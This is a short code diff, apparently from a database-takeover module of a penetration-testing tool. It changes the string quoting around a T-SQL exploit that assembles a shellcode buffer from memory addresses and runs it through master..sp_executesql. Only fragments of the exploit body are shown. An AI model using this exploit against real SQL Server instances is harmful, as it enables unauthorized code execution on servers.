@@ -72,7 +72,7 @@ class Takeover(GenericTakeover):
 
         shellcodeChar = shellcodeChar[:-1]
 
-        self.spExploit = """DECLARE @buf NVARCHAR(4000),
+        self.spExploit = '''DECLARE @buf NVARCHAR(4000),
         @val NVARCHAR(4),
         @counter INT
         SET @buf = '
@@ -135,7 +135,7 @@ class Takeover(GenericTakeover):
         END
         SET @buf = @buf + """,''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41"""
         EXEC master..sp_executesql @buf
-        """ % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)
+        ''' % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)
 
         self.spExploit = self.spExploit.replace("    ", "").replace("\n", " ")
 
